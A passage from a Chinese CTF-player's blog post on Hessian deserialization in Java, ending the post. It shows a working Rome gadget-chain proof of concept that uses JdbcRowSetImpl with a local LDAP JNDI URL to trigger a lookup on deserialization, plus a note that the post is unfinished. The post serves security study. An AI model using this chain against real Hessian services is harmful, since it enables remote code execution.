class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(bao);</span><br><span class="line">        output.writeObject(o);</span><br><span class="line">        System.out.println(bao.toString());</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bai);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> input.readObject();</span><br><span class="line">        <span class="keyword">return</span> (T) o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:8085/YbiMqGUd&quot;</span>;</span><br><span class="line">        jdbcRowSet.setDataSourceName(url);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//手动生成HashMap，防止提前调用hashcode()</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(equalsBean,<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] s = serialize(hashMap);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println((HashMap)deserialize(s));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/e565a696324cf548233e39f212621a83.png" alt=""></p>
+<p>到这里其实没写完，但是电脑出问题了，后面好了一会把 md 发出来了</p>
+<p>电脑可能是内存不够了，内存直接拉满了一直黑屏，可惜还没到换电脑的时候。。。</p>
+<p>未完成事项都先放到周末吧，唉，第一个周末真的是一言难尽</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/05/28/CISCN_2023/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2023-06-05 17:36:36
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                        <b>#</b> 代码审计
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/Java%E5%AE%89%E5%85%A8/" title="Java安全">
+                        <b>#</b> Java安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2023/07/23/funny_go1/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-hessian%E7%AE%80%E4%BB%8B"><span class="toc-text"> 0x01 Hessian 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#hessian%E6%A6%82%E5%BF%B5%E5%9B%BE"><span class="toc-text"> Hessian 概念图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E6%89%A9%E5%B1%95"><span class="toc-text"> 总结 &amp; 扩展</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-text"> 测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-text"> 0x02 调试分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E7%94%A8%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-text"> 无用的流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text"> 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rome%E9%93%BE"><span class="toc-text"> Rome 链</span></a></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/ki10Moc/">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="ki10Moc1949@gmail.com">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="facebook" target="_blank" rel="noopener" href="https://www.facebook.com/profile.php?id=100083345720708">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/ki10moc1/status/1494844731544662019?s=21&t=l-0lygAzRMHeJeBklnPt-A">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/ki10Moc/">Copyright © 2025 ki10Moc</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/ki10Moc/">霍布斯鲍姆学徒 | CTFer</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96 + '&url=' + https%3A%2F%2Fki10moc.github.io%2F2023%2F06%2F05%2FHessian%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://ki10moc.github.io/2023/06/05/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
